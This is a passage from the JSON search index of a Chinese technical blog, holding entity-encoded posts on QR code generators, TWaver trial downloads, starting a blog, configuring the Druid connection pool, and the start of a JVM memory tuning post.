&#x5BA2;&#x6237;&#x7AEF;&#x5E94;&#x7528;&#x53EF;&#x4EE5;&#x5728;&#x8282;&#x70B9;&#x4E0A;&#x8BBE;&#x7F6E;&#x76D1;&#x89C6;&#x5668; &#x8282;&#x70B9;&#x4E0D;&#x652F;&#x6301;&#x90E8;&#x5206;&#x8BFB;&#x5199;&#xFF0C;&#x800C;&#x662F;&#x4E00;&#x6B21;&#x6027;&#x5B8C;&#x6574;&#x8BFB;&#x5199;","raw":null,"content":null,"categories":[{"name":"大数据","slug":"大数据","permalink":"http://www.wangxin123.com/categories/大数据/"}],"tags":[{"name":"Zookeeper","slug":"Zookeeper","permalink":"http://www.wangxin123.com/tags/Zookeeper/"}]},{"title":"自定义二维码","slug":"自定义二维码","date":"2016-05-14T13:18:00.000Z","updated":"2016-11-17T11:59:42.682Z","comments":true,"path":"2016/05/14/自定义二维码/","link":"","permalink":"http://www.wangxin123.com/2016/05/14/自定义二维码/","excerpt":"&#x4E8C;&#x7EF4;&#x7801;&#x4E0D;&#x4E00;&#x5B9A;&#x662F;&#x5355;&#x8C03;&#x7684;&#x9ED1;&#x767D;&#x683C;&#x5B50;&#xFF0C;&#x4E5F;&#x53EF;&#x4EE5;&#x5F88;&#x4E30;&#x5BCC;&#x3002; &#x6700;&#x8FD1;&#x7528;&#x5230;&#x7684;&#x4E8C;&#x7EF4;&#x7801;&#x5728;&#x7EBF;&#x751F;&#x6210;&#x7F51;&#x7AD9;&#xFF1A; &#x4E8C;&#x7EF4;&#x5DE5;&#x574A;&#xFF1A;http://visual.2weima.com/ &#x4E91;&#x6765;&#x56FE;&#x5F62;&#x4E8C;&#x7EF4;&#x7801;&#xFF1A;http://qrcode.yunlai.cn/ &#x6211;&#x7ED9;&#x201D;&#x661F;&#x7A7A;&#x535A;&#x5BA2;&#x201D;&#x7F51;&#x7AD9;&#x751F;&#x6210;&#x7684;&#x4E8C;&#x7EF4;&#x7801;&#xFF1A;","keywords":null,"text":"&#x4E8C;&#x7EF4;&#x7801;&#x4E0D;&#x4E00;&#x5B9A;&#x662F;&#x5355;&#x8C03;&#x7684;&#x9ED1;&#x767D;&#x683C;&#x5B50;&#xFF0C;&#x4E5F;&#x53EF;&#x4EE5;&#x5F88;&#x4E30;&#x5BCC;&#x3002; &#x6700;&#x8FD1;&#x7528;&#x5230;&#x7684;&#x4E8C;&#x7EF4;&#x7801;&#x5728;&#x7EBF;&#x751F;&#x6210;&#x7F51;&#x7AD9;&#xFF1A; &#x4E8C;&#x7EF4;&#x5DE5;&#x574A;&#xFF1A;http://visual.2weima.com/ &#x4E91;&#x6765;&#x56FE;&#x5F62;&#x4E8C;&#x7EF4;&#x7801;&#xFF1A;http://qrcode.yunlai.cn/ &#x6211;&#x7ED9;&#x201D;&#x661F;&#x7A7A;&#x535A;&#x5BA2;&#x201D;&#x7F51;&#x7AD9;&#x751F;&#x6210;&#x7684;&#x4E8C;&#x7EF4;&#x7801;&#xFF1A; &#x751F;&#x6210;&#x7684;&#x52A8;&#x56FE;&#x4E8C;&#x7EF4;&#x7801;&#x5982;&#x679C;&#x8F83;&#x5927;&#xFF0C;&#x9700;&#x8981;&#x8FDB;&#x884C;&#x76F8;&#x5173;&#x538B;&#x7F29;&#xFF0C;&#x4E0D;&#x7136;&#x9875;&#x9762;&#x52A0;&#x8F7D;&#x6BD4;&#x8F83;&#x6162;&#x538B;&#x7F29;&#x5DE5;&#x5177;&#xFF1A;http://www.jb51.net/softs/107350.html &#x5173;&#x4E8E;&#x4E8C;&#x7EF4;&#x7801;&#x66F4;&#x591A;&#x8BE6;&#x60C5;&#xFF0C;&#x53EF;&#x4EE5;&#x53BB;&#x77E5;&#x4E4E;&#x4E0A;&#x67E5;&#x627E;&#xFF0C;&#x8F93;&#x5165;&#x201D;&#x4E8C;&#x7EF4;&#x7801;&#x201D;&#x5373;&#x53EF; &#x56FE;&#x6587;&#x5E76;&#x8302;&#xFF0C;&#x4ECB;&#x7ECD;&#x7684;&#x975E;&#x5E38;&#x8BE6;&#x7EC6;&#xFF0C;&#x6BD4;&#x5982;&#x4E0B;&#x9762;&#x8FD9;&#x7BC7;&#x6587;&#x7AE0;&#x4E8C;&#x7EF4;&#x7801;&#x600E;&#x4E48;&#x624D;&#x4F1A;&#x8BA9;&#x4EBA;&#x6709;&#x626B;&#x7684;&#x51B2;&#x52A8;&#xFF1A;https://www.zhihu.com/question/21546400","raw":null,"content":null,"categories":[{"name":"其他技术","slug":"其他技术","permalink":"http://www.wangxin123.com/categories/其他技术/"}],"tags":[]},{"title":"TWaver 2D+GIS+3D的试用和在线Demo","slug":"TWaver 2D+GIS+3D的试用和在线Demo","date":"2016-05-10T13:18:00.000Z","updated":"2016-11-17T11:59:42.671Z","comments":true,"path":"2016/05/10/TWaver 2D+GIS+3D的试用和在线Demo/","link":"","permalink":"http://www.wangxin123.com/2016/05/10/TWaver 2D+GIS+3D的试用和在线Demo/","excerpt":"","keywords":null,"text":"TWaver 2D for HTML5&#x8BD5;&#x7528;&#x4E0B;&#x8F7D;&#xFF1A;http://download.servasoft.com/dl/twaver/sssyuwyeriUR/k/twaver-html5-5.4.7.zip TWaver GIS for HTML5&#x8BD5;&#x7528;&#x4E0B;&#x8F7D;&#xFF1A;http://download.servasoft.com/dl/twaver/sssyuwyeriUR/k/twavergis-html5-5.4.7.zip TWaver 3D for HTML5&#x8BD5;&#x7528;&#x4E0B;&#x8F7D;&#xFF1A;&#x5404;&#x79CD;&#x5728;&#x7EBF;3D Demo&#xFF1A;http://idc.servasoft.com:8081/twaver-html5-3d/&#x4E09;&#x7EF4;&#x673A;&#x623F;&#x3001;&#x53D8;&#x7535;&#x7AD9;&#x3001;&#x4F1A;&#x8BAE;&#x5BA4;&#x7B49;&#x90FD;&#x5728;&#x91CC;&#x9762;&#x3002; TWaver 3D for HTML5&#xFF08;SDK/&#x5F15;&#x64CE;&#xFF09;&#x7684;&#x8BD5;&#x7528;&#x4E0B;&#x8F7D;&#xFF08;&#x8FD9;&#x4E2A;&#x91CC;&#x9762;&#x6709;&#x4E0A;&#x9762;&#x5728;&#x7EBF;demo&#x7684;&#x6E90;&#x4EE3;&#x7801;&#xFF09;http://download.servasoft.com/dl/twaver/sssyuwyeriUR/k/twaver-html5-3d-2.2.0.zip&#x6587;&#x6863;http://doc.servasoft.com/twaver-document-center/twaver-html5-3d-v2/ TWaver Make&#xFF08;&#x6A21;&#x578B;&#x5E93;&#xFF09;&#x7684;&#x4E0B;&#x8F7D;&#x94FE;&#x63A5;&#x548C;&#x6587;&#x6863;&#xFF1A;http://download.servasoft.com/dl/twaver/sssyuwyeriUR/k/twaver-make-1.4.zip&#x6587;&#x6863;http://doc.servasoft.com/twaver-document-center/twaver-make/ TWaver Doodle&#xFF08;&#x7F16;&#x8F91;&#x5668;&#xFF09;&#x7684;&#x4E0B;&#x8F7D;&#xFF1A;http://download.servasoft.com/dl/twaver/sssyuwyeriUR/k/twaver-doodle-1.4.zip&#x6587;&#x6863;http://doc.servasoft.com/twaver-document-center/twaver-doodle/ TWaver 2D for Java&#x8BD5;&#x7528;&#x4E0B;&#x8F7D;&#xFF1A;http://download.servasoft.com/dl/twaver/sssyuwyeriUR/k/twaver-java-4.6.3.zip TWaver GIS for Java&#x8BD5;&#x7528;&#x4E0B;&#x8F7D;&#xFF1A;http://download.servasoft.com/dl/twaver/sssyuwyeriUR/k/twavergis-java-4.5.6.zip","raw":null,"content":null,"categories":[{"name":"其他技术","slug":"其他技术","permalink":"http://www.wangxin123.com/categories/其他技术/"}],"tags":[]},{"title":"开博这件事","slug":"开博这件事","date":"2016-04-27T13:18:00.000Z","updated":"2017-02-16T01:55:04.677Z","comments":true,"path":"2016/04/27/开博这件事/","link":"","permalink":"http://www.wangxin123.com/2016/04/27/开博这件事/","excerpt":"","keywords":null,"text":"&#x672C;&#x4EBA;&#x6709;&#x70B9;&#x61D2;&#xFF0C;&#x4E0D;&#x592A;&#x559C;&#x6B22;&#x7528;&#x8111;&#x5B50;&#x523B;&#x610F;&#x53BB;&#x8BB0;&#x4E00;&#x4E9B;&#x4E1C;&#x897F;&#x3002;&#x4F46;&#x662F;&#x4E1C;&#x897F;&#x591A;&#x4E86;&#x6613;&#x5FD8;&#xFF0C;&#x6015;&#x5FD8;&#xFF0C;&#x6240;&#x4EE5;&#x5DE5;&#x4F5C;&#x4E2D;&#x9010;&#x6E10;&#x517B;&#x6210;&#x4E86;&#x8BB0;&#x5F55;&#x7684;&#x4E60;&#x60EF;&#x3002;&#x6211;&#x7528;&#x7684;&#x662F;&#x6709;&#x9053;&#x4E91;&#xFF0C;&#x90A3;&#x91CC;&#x6309;&#x7C7B;&#x522B;&#x8BB0;&#x5F55;&#x4E86;&#x6211;&#x6700;&#x8FD1;&#x51E0;&#x5E74;&#x7684;&#x5DE5;&#x4F5C;&#x6240;&#x5F97;&#x3002;&#x53EF;&#x662F;&#x968F;&#x7740;&#x5185;&#x5BB9;&#x589E;&#x591A;&#xFF0C;&#x6162;&#x6162;&#x53D1;&#x73B0;&#x4E86;&#x4E00;&#x4E2A;&#x95EE;&#x9898;&#xFF1A;&#x6709;&#x4E9B;&#x77E5;&#x8BC6;&#x8BB0;&#x4E0B;&#x4E86;&#xFF0C;&#x4ECD;&#x7136;&#x4E0D;&#x662F;&#x4F60;&#x7684;&#x3002; &#x6211;&#x77E5;&#x9053;&#x8BB0;&#x5F55;&#x80FD;&#x7ED9;&#x6211;&#x5E26;&#x6765;&#x5DE8;&#x5927;&#x597D;&#x5904;&#xFF0C;&#x767D;&#x5E95;&#x9ED1;&#x5B57;&#x4F1A;&#x4E0D;&#x65AD;&#x7684;&#x901A;&#x8FC7;&#x89C6;&#x89C9;&#x523A;&#x6FC0;&#x6765;&#x63D0;&#x9192;&#x6211;&#x5B83;&#x7684;&#x5B58;&#x5728;&#x8BA9;&#x6211;&#x4E0D;&#x5FC5;&#x82B1;&#x5927;&#x529B;&#x6C14;&#x53BB;&#x523B;&#x610F;&#x8BB0;&#x5FC6;&#x66FE;&#x7ECF;&#x6240;&#x5B66;&#x6240;&#x60F3;&#xFF0C;&#x800C;&#x53EA;&#x9700;&#x817E;&#x51FA;&#x7CBE;&#x529B;&#x5BF9;&#x6240;&#x8BB0;&#x5185;&#x5BB9;&#x8FDB;&#x884C;&#x8865;&#x5145;&#x5B8C;&#x5584;&#x3002; &#x53EF;&#x60DC;&#x884C;&#x52A8;&#x603B;&#x8DDF;&#x4E0D;&#x4E0A;&#x601D;&#x7EF4;&#x7684;&#x8282;&#x594F;&#xFF0C;&#x7A0D;&#x6709;&#x61C8;&#x6020;&#xFF0C;&#x8BB0;&#x5F55;&#x4FBF;&#x7EAF;&#x7CB9;&#x4E3A;&#x4E86;&#x8BB0;&#x5F55;&#x800C;&#x8BB0;&#x5F55;&#x3002;&#x5728;&#x5FAE;&#x4FE1;&#x516C;&#x4F17;&#x53F7;&#x4E0A;&#x770B;&#x5230;&#x4E00;&#x7BC7;&#x6280;&#x672F;&#x6587;&#x7AE0;&#xFF0C;&#x6709;&#x65F6;&#x89C9;&#x5F97;&#x633A;&#x597D;&#xFF0C;&#x968F;&#x624B;&#x5C31;&#x8BB0;&#x5F55;&#x5230;&#x4E86;&#x6709;&#x9053;&#x4E91;&#x3002;&#x53EF;&#x5927;&#x591A;&#x65F6;&#x5019;&#xFF0C;&#x8FD9;&#x4E2A;&#x8FC7;&#x7A0B;&#x6CA1;&#x6709;&#x601D;&#x8003;&#xFF0C;&#x6CA1;&#x6709;&#x603B;&#x7ED3;&#xFF0C;&#x597D;&#x50CF;&#x5C31;&#x53EA;&#x662F;&#x770B;&#x4E86;&#x4E00;&#x4E2A;&#x6545;&#x4E8B;&#x3002; &#x5B54;&#x5B50;&#x6709;&#x4E91;: &#x5B66;&#x800C;&#x4E0D;&#x601D;&#x5219;&#x7F54;&#xFF0C;&#x601D;&#x800C;&#x4E0D;&#x5B66;&#x5219;&#x6B86;&#x3002;&#x5F53;&#x4F60;&#x8BB0;&#x5F55;&#x7684;&#x67D0;&#x4E2A;&#x77E5;&#x8BC6;&#x70B9;&#xFF0C;&#x540E;&#x671F;&#x4E0D;&#x65AD;&#x67E5;&#x770B;&#x5374;&#x8FD8;&#x603B;&#x662F;&#x6A21;&#x68F1;&#x4E24;&#x53EF;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x5C31;&#x8981;&#x53CD;&#x601D;&#x4E86;&#x3002; &#x7136;&#x540E;&#x6211;&#x5C31;&#x60F3;&#x5230;&#x4E86;&#x5F00;&#x535A;&#x8FD9;&#x4EF6;&#x4E8B;&#xFF0C;&#x5F00;&#x535A;&#x610F;&#x5473;&#x7740;&#x516C;&#x5F00;&#xFF0C;&#x516C;&#x5F00;&#x610F;&#x5473;&#x7740;&#x5206;&#x4EAB;&#x3002;&#x5206;&#x4EAB;&#x4F1A;&#x8BA9;&#x6211;&#x4E0D;&#x53EF;&#x907F;&#x514D;&#x7684;&#x53BB;&#x601D;&#x8003;&#x548C;&#x603B;&#x7ED3;&#xFF0C;&#x53BB;&#x5199;&#x51FA;&#x8BA9;&#x4EBA;&#x773C;&#x524D;&#x4E00;&#x4EAE;&#x7684;&#x4E1C;&#x897F;&#x3002; &#x6700;&#x8FD1;&#x5728;&#x4E91;&#x6816;&#x793E;&#x533A;&#x770B;&#x4E86;&#x4E00;&#x7BC7;&#x6587;&#x7AE0;&#xFF0C;&#x91CC;&#x9762;&#x8C08;&#x5230;&#x7A0B;&#x5E8F;&#x5458;&#x600E;&#x4E48;&#x63D0;&#x5347;&#x81EA;&#x8EAB;&#x4EF7;&#x503C;&#xFF0C;&#x7A0B;&#x5E8F;&#x5458;&#x7684;&#x5F71;&#x54CD;&#x529B;&#x4E00;&#x822C;&#x4F53;&#x73B0;&#x5728;: 12345678910&#x5BF9;&#x5185;&#xFF1A;&#x5728;&#x5C0F;&#x7EC4;&#x5185;&#x90E8;&#x4F60;&#x6280;&#x672F;&#x6700;&#x725B;&#xFF0C;&#x5C0F;&#x4F19;&#x4F34;&#x4EEC;&#x6709;&#x5404;&#x79CD;&#x7591;&#x96BE;&#x6742;&#x75C7;&#x89E3;&#x51B3;&#x4E0D;&#x4E86;&#x7684;&#x65F6;&#x5019;&#x90FD;&#x4F1A;&#x60F3;&#x5230;&#x4F60;&#x3002;&#x4EA7;&#x54C1;&#x5BF9;&#x4F60;&#x975E;&#x5E38;&#x6709;&#x4FE1;&#x5FC3;&#xFF0C;&#x7ED9;&#x4F60;&#x7684;&#x9700;&#x6C42;&#x4F60;&#x90FD;&#x80FD;&#x9AD8;&#x5EA6;&#x3002;&#x4F60;&#x7ECF;&#x5E38;&#x4E3B;&#x52A8;&#x7ED9;&#x5C0F;&#x4F19;&#x4F34;&#x4EEC;&#x5206;&#x4EAB;&#x65B0;&#x6280;&#x672F;&#x3001;&#x65B0;&#x4E1C;&#x897F;&#xFF0C;&#x5C0F;&#x4F19;&#x4F34;&#x77E5;&#x9053;&#x7684;&#x4F60;&#x90FD;&#x77E5;&#x5230;&#xFF0C;&#x5C0F;&#x4F19;&#x4F34;&#x4E0D;&#x77E5;&#x9053;&#x7684;&#x4F60;&#x4E5F;&#x77E5;&#x9053;&#x3002;&#x5BF9;&#x5916;&#xFF1A;&#x4F60;&#x53C2;&#x4E0E;&#x8FC7;&#x77E5;&#x540D;&#x4EA7;&#x54C1;&#x7684;&#x67B6;&#x6784;&#x5F00;&#x53D1;&#xFF0C;&#x5BF9;&#x5916;&#x53C2;&#x52A0;&#x5206;&#x4EAB;&#x4F1A;&#x3002;&#x4F60;&#x662F;&#x67D0;&#x4E2A;&#x725B;&#x903C;&#x5F00;&#x6E90;&#x7EC4;&#x4EF6;&#x7684;&#x4F5C;&#x8005;&#x3002;&#x4F60;&#x5199;&#x8FC7;&#x67D0;&#x65B9;&#x9762;&#x6280;&#x672F;&#x7C7B;&#x4E66;&#x3002;&#x4F60;&#x7684;&#x535A;&#x5BA2;&#x6BD4;&#x8F83;&#x6709;&#x540D;&#xFF0C;&#x6709;&#x5F88;&#x591A;&#x7C89;&#x4E1D;&#x3002; &#x770B;&#x8D77;&#x6765;&#x5F88;&#x96BE;&#xFF0C;&#x4F46;&#x662F;&#x77E5;&#x9053;&#x76EE;&#x6807;&#x4E86;&#xFF0C;&#x600E;&#x4E48;&#x505A;&#x5C31;&#x660E;&#x786E;&#x5F88;&#x591A;&#x4E86;&#x3002;&#x6587;&#x7AE0;&#x7684;&#x5EFA;&#x8BAE;&#x5927;&#x81F4;&#x662F;&#xFF0C;&#x6311;&#x6218;&#x5404;&#x79CD;&#x7591;&#x96BE;&#x6742;&#x75C7;&#xFF0C;&#x7ECF;&#x5E38;&#x603B;&#x7ED3;&#xFF1B;&#x591A;&#x56DE;&#x5934;&#x6574;&#x7406;&#x9879;&#x76EE;&#x4EE3;&#x7801;&#xFF0C;&#x6C89;&#x6DC0;&#x516C;&#x7528;&#x7EC4;&#x5EFA;&#xFF1B;&#x591A;&#x8BFB;&#x4E66;&#xFF0C;&#x63D0;&#x9AD8;&#x89C6;&#x91CE;&#xFF1B;&#x7ECF;&#x5E38;&#x5199;&#x535A;&#x5BA2;&#xFF0C;&#x603B;&#x7ED3;&#x68B3;&#x7406;&#x77E5;&#x8BC6;&#xFF1B;&#x591A;&#x753B;&#x601D;&#x7EF4;&#x5BFC;&#x56FE;&#x3001;&#x6280;&#x672F;&#x56FE;&#x8C31;&#xFF0C;&#x628A;&#x77E5;&#x8BC6;&#x90FD;&#x4E32;&#x8D77;&#x6765;&#xFF1B; &#x6240;&#x4EE5;&#x6211;&#x5E0C;&#x671B;&#x5F00;&#x535A;&#x5BF9;&#x6211;&#x662F;&#x4E00;&#x4E2A;&#x597D;&#x7684;&#x5F00;&#x7AEF;&#x3002;&#x6559;&#x662F;&#x6700;&#x597D;&#x7684;&#x5B66;&#xFF0C;&#x79EF;&#x6781;&#x5206;&#x4EAB;&#xFF0C;&#x5927;&#x5BB6;&#x5171;&#x52C9;&#x3002;","raw":null,"content":null,"categories":[{"name":"随笔","slug":"随笔","permalink":"http://www.wangxin123.com/categories/随笔/"}],"tags":[]},{"title":"Druid","slug":"Druid","date":"2016-04-24T14:10:00.000Z","updated":"2016-11-17T11:59:42.662Z","comments":true,"path":"2016/04/24/Druid/","link":"","permalink":"http://www.wangxin123.com/2016/04/24/Druid/","excerpt":"","keywords":null,"text":"Druid&#x662F;&#x963F;&#x91CC;&#x5DF4;&#x5DF4;&#x7684;&#x5F00;&#x6E90;&#x9879;&#x76EE;&#xFF0C;&#x5B83;&#x5728;&#x76D1;&#x63A7;&#x3001;&#x53EF;&#x6269;&#x5C55;&#x6027;&#x3001;&#x7A33;&#x5B9A;&#x6027;&#x548C;&#x6027;&#x80FD;&#x65B9;&#x9762;&#xFF0C;&#x76F8;&#x5BF9;&#x4E8E;&#x5176;&#x4ED6;&#x6570;&#x636E;&#x5E93;&#x8FDE;&#x63A5;&#x6C60;&#x90FD;&#x6709;&#x8F83;&#x660E;&#x663E;&#x7684;&#x4F18;&#x52BF; &#x7F51;&#x7AD9;&#x5B98;&#x7F51;&#x4ECB;&#x7ECD;&#xFF1A;https://github.com/alibaba/druid/wiki/&#x5E38;&#x89C1;&#x95EE;&#x9898;&#x963F;&#x91CC;&#x5DF4;&#x5DF4;&#x5F00;&#x6E90;&#x9879;&#x76EE;Druid&#x8D1F;&#x8D23;&#x4EBA;&#x6E29;&#x5C11;&#x8BBF;&#x8C08;&#xFF1A;http://www.iteye.com/magazines/90&#x914D;&#x7F6E;&#x65B9;&#x6CD5;&#x5982;&#x4E0B;&#xFF1A;http://blog.csdn.net/pk490525/article/details/12621649 &#x95EE;&#x9898;&#x5B9E;&#x8DF5;&#x9047;&#x5230;&#x7684;&#x95EE;&#x9898;&#xFF1A;&#x5B98;&#x7F51;&#x4E0B;&#x8F7D; druid-1.0.17.jar&#xFF0C;&#x5F15;&#x5165;&#x5E76;&#x914D;&#x7F6E;&#x597D;&#x76F8;&#x5173;&#x6587;&#x4EF6;&#x540E;&#xFF0C;&#x542F;&#x52A8;&#x62A5;&#x4E86;&#x4E00;&#x4E2A;&#x8B66;&#x544A; &#x67E5;&#x770B;&#x6E90;&#x7801;&#x5982;&#x4E0B;&#xFF1A; &#x539F;&#x56E0;&#xFF1A;&#x5E94;&#x8BE5;&#x662F;mysql&#x9A71;&#x52A8;&#x592A;&#x8001;&#x4E86;&#xFF0C;&#x56E0;&#x4E3A;&#x4E0B;&#x8F7D;&#x7684;druid-1.0.17.jar&#x662F;16&#x5E74;&#x6700;&#x65B0;&#x53D1;&#x5E03;&#x7684;&#xFF0C;&#x53BB;mysql&#x5B98;&#x7F51;&#x4E0B;&#x8F7D;&#x6700;&#x65B0;jar&#x5305;&#x540E;&#xFF0C;&#x95EE;&#x9898;&#x89E3;&#x51B3; &#x8FD0;&#x884C;&#x7ED3;&#x679C;&#x542F;&#x52A8;&#x540E;&#x9879;&#x76EE;&#xFF0C;http://localhost:8080/ichargerclouds/druid/index.html&#x76D1;&#x63A7;&#x9875;&#x9762;&#x8FD0;&#x884C;&#x5982;&#x4E0B;&#xFF1A;","raw":null,"content":null,"categories":[{"name":"WEB后端","slug":"WEB后端","permalink":"http://www.wangxin123.com/categories/WEB后端/"}],"tags":[{"name":"Druid","slug":"Druid","permalink":"http://www.wangxin123.com/tags/Druid/"}]},{"title":"JVM性能调优","slug":"JVM性能调优","date":"2016-04-20T10:24:17.000Z","updated":"2016-11-17T11:59:42.664Z","comments":true,"path":"2016/04/20/JVM性能调优/","link":"","permalink":"http://www.wangxin123.com/2016/04/20/JVM性能调优/","excerpt":"&#x6700;&#x8FD1;&#x56E0;&#x9879;&#x76EE;&#x5B58;&#x5728;&#x5185;&#x5B58;&#x6CC4;&#x6F0F;&#xFF0C;&#x6545;&#x8FDB;&#x884C;&#x5927;&#x89C4;&#x6A21;&#x7684;JVM&#x6027;&#x80FD;&#x8C03;&#x4F18;&#xFF0C;&#x73B0;&#x628A;&#x76F8;&#x5173;&#x77E5;&#x8BC6;&#x8FDB;&#x884C;&#x5F52;&#x7EB3;&#x603B;&#x7ED3; &#x4E00;&#x3001;JVM&#x5185;&#x5B58;&#x6A21;&#x578B;&#x53CA;&#x5783;&#x573E;&#x6536;&#x96C6;&#x7B97;&#x6CD5;1.&#x5185;&#x5B58;&#x6A21;&#x578B;&#x6839;&#x636E;Java&#x865A;&#x62DF;&#x673A;&#x89C4;&#x8303;&#xFF0C;JVM&#x5C06;&#x5185;&#x5B58;&#x5212;&#x5206;&#x4E3A;&#xFF1A; &#x5E74;&#x8F7B;&#x4EE3;&#xFF08;New&#xFF09;&#xFF1A;&#x5E74;&#x8F7B;&#x4EE3;&#x7528;&#x6765;&#x5B58;&#x653E;JVM&#x521A;&#x5206;&#x914D;&#x7684;Java&#x5BF9;&#x8C61; &#x5E74;&#x8001;&#x4EE3;&#xFF08;Tenured)&#xFF1A;&#x5E74;&#x8F7B;&#x4EE3;&#x4E2D;&#x7ECF;&#x8FC7;&#x5783;&#x573E;&#x56DE;&#x6536;&#x6CA1;&#x6709;&#x56DE;&#x6536;&#x6389;&#x7684;&#x5BF9;&#x8C61;&#x5C06;&#x88AB;Copy&#x5230;&#x5E74;&#x8001;&#x4EE3; &#x6C38;&#x4E45;&#x4EE3;&#xFF08;Perm&#xFF09;&#xFF1A;&#x6C38;&#x4E45;&#x4EE3;&#x5B58;&#x653E;Class&#x3001;Method&#x5143;&#x4FE1;&#x606F;&#xFF0C;&#x5176;&#x5927;&#x5C0F;&#x8DDF;&#x9879;&#x76EE;&#x7684;&#x89C4;&#x6A21;&#x3001;&#x7C7B;&#x3001;&#x65B9;&#x6CD5;&#x7684;&#x91CF;&#x6709;&#x5173;&#xFF0C;&#x4E00;&#x822C;&#x8BBE;&#x7F6E;&#x4E3A;128M&#x5C31;&#x8DB3;&#x591F;&#xFF0C;&#x8BBE;&#x7F6E;&#x539F;&#x5219;&#x662F;&#x9884;&#x7559;30%&#x7684;&#x7A7A;&#x95F4;&#x3002; &#x5176;&#x4E2D;New&#x548C;Tenured&#x5C5E;&#x4E8E;&#x5806;&#x5185;&#x5B58;&#xFF0C;&#x5806;&#x5185;&#x5B58;&#x4F1A;&#x4ECE;JVM&#x542F;&#x52A8;&#x53C2;&#x6570;&#xFF08;-Xmx:3G&#xFF09;&#x6307;&#x5B9A;&#x7684;&#x5185;&#x5B58;&#x4E2D;&#x5206;&#x914D;&#x3002;Perm&#x4E0D;&#x5C5E;&#x4E8E;&#x5806;&#x5185;&#x5B58;&#xFF0C;&#x6709;&#x865A;&#x62DF;&#x673A;&#x76F4;&#x63A5;&#x5206;&#x914D;&#xFF0C;&#x4F46;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;-XX:PermSize -XX:MaxPermSize &#x7B49;&#x53C2;&#x6570;&#x8C03;&#x6574;&#x5176;&#x5927;&#x5C0F;&#x3002; New&#x53C8;&#x5206;&#x4E3A;&#x51E0;&#x4E2A;&#x90E8;&#x5206;&#xFF1A; Eden&#xFF1A;Eden&#x7528;&#x6765;&#x5B58;&#x653E;JVM&#x521A;&#x5206;&#x914D;&#x7684;&#x5BF9;&#x8C61; Survivor1 Survivro2&#xFF1A;&#x4E24;&#x4E2A;Survivor&#x7A7A;&#x95F4;&#x4E00;&#x6837;&#x5927;&#xFF0C;&#x5F53;Eden&#x4E2D;&#x7684;&#x5BF9;&#x8C61;&#x7ECF;&#x8FC7;&#x5783;&#x573E;&#x56DE;&#x6536;&#x6CA1;&#x6709;&#x88AB;&#x56DE;&#x6536;&#x6389;&#x65F6;&#xFF0C;&#x4F1A;&#x5728;&#x4E24;&#x4E2A;Survivor&#x4E4B;&#x95F4;&#x6765;&#x56DE;Copy&#xFF0C;&#x5F53;&#x6EE1;&#x8DB3;&#x67D0;&#x4E2A;&#x6761;&#x4EF6;&#xFF0C;&#x6BD4;&#x5982;Copy&#x6B21;&#x6570;&#xFF0C;&#x5C31;&#x4F1A;&#x88AB;Copy&#x5230;Tenured&#x3002;&#x663E;&#x7136;&#xFF0C;Survivor&#x53EA;&#x662F;&#x589E;&#x52A0;&#x4E86;&#x5BF9;&#x8C61;&#x5728;&#x5E74;&#x8F7B;&#x4EE3;&#x4E2D;&#x7684;&#x9017;&#x7559;&#x65F6;&#x95F4;&#xFF0C;&#x589E;&#x52A0;&#x4E86;&#x88AB;&#x5783;&#x573E;&#x56DE;&#x6536;&#x7684;&#x53EF;&#x80FD;&#x6027;&#x3002; 2.&#x5783;&#x573E;&#x56DE;&#x6536;&#x7B97;&#x6CD5;&#x5783;&#x573E;&#x56DE;&#x6536;&#x7B97;&#x6CD5;&#x53EF;&#x4EE5;&#x5206;&#x4E3A;&#x4E09;&#x7C7B;&#xFF0C;&#x90FD;&#x57FA;&#x4E8E;&#x6807;&#x8BB0;-&#x6E05;&#x9664;&#xFF08;&#x590D;&#x5236;&#xFF09;&#x7B97;&#x6CD5;&#xFF1A; Serial&#x7B97;&#x6CD5;&#xFF08;&#x5355;&#x7EBF;&#x7A0B;&#xFF09; &#x5E76;&#x884C;&#x7B97;&#x6CD5; &#x5E76;&#x53D1;&#x7B97;&#x6CD5; JVM&#x4F1A;&#x6839;&#x636E;&#x673A;&#x5668;&#x7684;&#x786C;&#x4EF6;&#x914D;&#x7F6E;&#x5BF9;&#x6BCF;&#x4E2A;&#x5185;&#x5B58;&#x4EE3;&#x9009;&#x62E9;&#x9002;&#x5408;&#x7684;&#x56DE;&#x6536;&#x7B97;&#x6CD5;&#xFF0C;&#x6BD4;&#x5982;&#xFF0C;&#x5982;&#x679C;&#x673A;&#x5668;&#x591A;&#x4E8E;1&#x4E2A;&#x6838;&#xFF0C;&#x4F1A;&#x5BF9;&#x5E74;&#x8F7B;&#x4EE3;&#x9009;&#x62E9;&#x5E76;&#x884C;&#x7B97;&#x6CD5;&#xFF0C;&#x5173;&#x4E8E;&#x9009;&#x62E9;&#x7EC6;&#x8282;&#x8BF7;&#x53C2;&#x8003;JVM&#x8C03;&#x4F18;&#x6587;&#x6863;&#x3002; &#x7A0D;&#x5FAE;&#x89E3;&#x91CA;&#x4E0B;&#x7684;&#x662F;&#xFF0C;&#x5E76;&#x884C;&#x7B97;&#x6CD5;&#x662F;&#x7528;&#x591A;&#x7EBF;&#x7A0B;&#x8FDB;&#x884C;&#x5783;&#x573E;&#x56DE;&#x6536;&#xFF0C;&#x56DE;&#x6536;&#x671F;&#x95F4;&#x4F1A;&#x6682;&#x505C;&#x7A0B;&#x5E8F;&#x7684;&#x6267;&#x884C;&#xFF0C;&#x800C;&#x5E76;&#x53D1;&#x7B97;&#x6CD5;&#xFF0C;&#x4E5F;&#x662F;&#x591A;&#x7EBF;&#x7A0B;&#x56DE;&#x6536;&#xFF0C;&#x4F46;&#x671F;&#x95F4;&#x4E0D;&#x505C;&#x6B62;&#x5E94;&#x7528;&#x6267;&#x884C;&#x3002;&#x6240;&#x4EE5;&#xFF0C;&#x5E76;&#x53D1;&#x7B97;&#x6CD5;&#x9002;&#x7528;&#x4E8E;&#x4EA4;&#x4E92;&#x6027;&#x9AD8;&#x7684;&#x4E00;&#x4E9B;&#x7A0B;&#x5E8F;&#x3002;&#x7ECF;&#x8FC7;&#x89C2;&#x5BDF;&#xFF0C;&#x5E76;&#x53D1;&#x7B97;&#x6CD5;&#x4F1A;&#x51CF;&#x5C11;&#x5E74;&#x8F7B;&#x4EE3;&#x7684;&#x5927;&#x5C0F;&#xFF0C;&#x5176;&#x5B9E;&#x5C31;&#x662F;&#x4F7F;&#x7528;&#x4E86;&#x4E00;&#x4E2A;&#x5927;&#x7684;&#x5E74;&#x8001;&#x4EE3;&#xFF0C;&#x8FD9;&#x5